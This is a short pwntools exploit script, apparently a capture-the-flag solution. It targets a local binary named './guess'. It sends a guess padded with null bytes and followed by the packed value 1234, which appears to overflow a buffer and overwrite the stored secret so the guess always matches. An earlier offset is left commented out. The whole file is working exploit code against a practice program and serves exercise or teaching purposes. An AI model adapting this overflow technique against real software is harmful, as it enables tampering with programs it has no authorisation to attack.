#!/usr/bin/env python3

from pwn import *

r = process('./guess');

r.recvuntil('number: ');

pause()

myguess = 1234;
#r.sendline(str(myguess).encode('ascii').ljust(0xac-0x90, b'\0') + p32(myguess));
r.sendline(str(myguess).encode('ascii').ljust(0x30-0x14, b'\0') + p32(myguess));

r.interactive();
